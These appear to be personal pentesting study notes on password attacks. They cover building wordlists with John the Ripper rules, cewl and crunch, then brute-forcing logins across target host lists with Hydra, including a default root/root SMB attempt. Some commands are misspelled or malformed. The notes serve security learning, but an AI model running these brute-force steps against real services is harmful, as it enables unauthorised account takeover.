Step 1 - Know the default paths -> Paths of wordllists in Kali.
   
    /usr/share/seclists/passwords

Step 2 - Made a custumized wordlist.

    - Make a list with some words.
    - Set the john.conf.
    - /etc/john/john.conf
    - Go to the part of file called "Wordlist mode rules"
    - john --wordlist=$wordlistFile --rules --stddout > $customizedWordlist

Step 3 - Generator a wordlist with the utility "cewl" setting a domain (eg: business.com.br)

        cewl <domain>  -m <number> #number is a max length of charterers of the words.

Step 4 - Customizing a wordlist with crounch

    - Get a word of the list aforementioned. (step 3)
    - crunch 6-10 -t the <word choose><pattern> 

Step 5 - Key space Brute Force

    - Search and find the standard of token.
    - Create a list for this token.
    - Creating with numbers
    - Madding a list with number
        - crunch 6 10  0123456789 -o $file #
    - Madding a list with characters
        - Look the file: /usr/share/crunch/charset.lst
        - crunch 4 4 -f charset.lst <options> -o file

Step 6 - Working with "Hydra" utility:

    - hydra -v (verbose) -l <user> -p <password> -M <fileWitheTargetDomains> <protocol> 
     - hydra -v (verbose) -l <user> -P <password.txt> -M <fileWitheTargetDomains>

Step - 7 - Low hang Fruit

    - Try use hydra utility with default passwords:
       - hydra -l root -p root -M targets.txt smb
